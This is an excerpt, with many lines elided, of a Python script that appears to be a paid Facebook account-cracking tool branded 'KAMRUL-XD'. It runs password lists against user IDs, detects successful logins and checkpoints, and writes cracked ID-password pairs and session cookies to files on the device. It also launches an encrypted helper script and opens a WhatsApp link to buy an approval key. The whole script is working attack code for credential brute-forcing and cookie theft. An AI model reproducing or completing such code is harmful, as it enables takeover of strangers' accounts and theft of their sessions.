...
try:
	...
	os.system('python KAMRUL_enc.py')
...
def pp():
	...
	try:
			...
			if ky in ck:
				...
				os.system('xdg-open https://wa.me/+8801319644658?text=*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*YOUR*%20*KAMRUL*%20*TOOL*%20*PAID*%20*APPROVAL*%20/%20%20*My*%20*Key*%20*:*%20'+str(ky))
...
def rd1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [KAMRUL-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/KAMRUL-R-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/KAMRUL-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(ids))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        #print('\r\r\x1b[1;31m [KAMRUL-CP] '+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KAMRUL-R-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        sys.stdout.write('\r\r\033[1;31m [KAMRUL-M2] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        sys.stdout.write('\r\r\033[1;31m [KAMRUL-M3] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [KAMRUL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/KAMRUL-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [KAMRUL-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                open('/sdcard/KAMRUL-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/KAMRUL-file-coki-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        ##########print('\r\r\x1b[38;5;208m [ZAIN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KAMRUL-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
